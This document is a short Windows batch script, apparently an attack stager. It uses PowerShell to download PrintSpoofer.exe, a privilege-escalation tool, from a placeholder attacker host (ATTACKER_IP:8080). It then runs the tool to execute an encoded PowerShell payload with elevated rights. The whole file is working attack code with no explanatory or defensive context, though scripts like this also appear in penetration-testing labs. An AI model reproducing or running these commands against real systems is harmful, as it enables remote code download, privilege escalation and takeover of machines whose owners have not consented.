@echo off
powershell -Command "Invoke-WebRequest -Uri http://ATTACKER_IP:8080/PrintSpoofer.exe -OutFile PrintSpoofer.exe"
PrintSpoofer.exe -c "powershell -e BASE64_POWERSHELL"
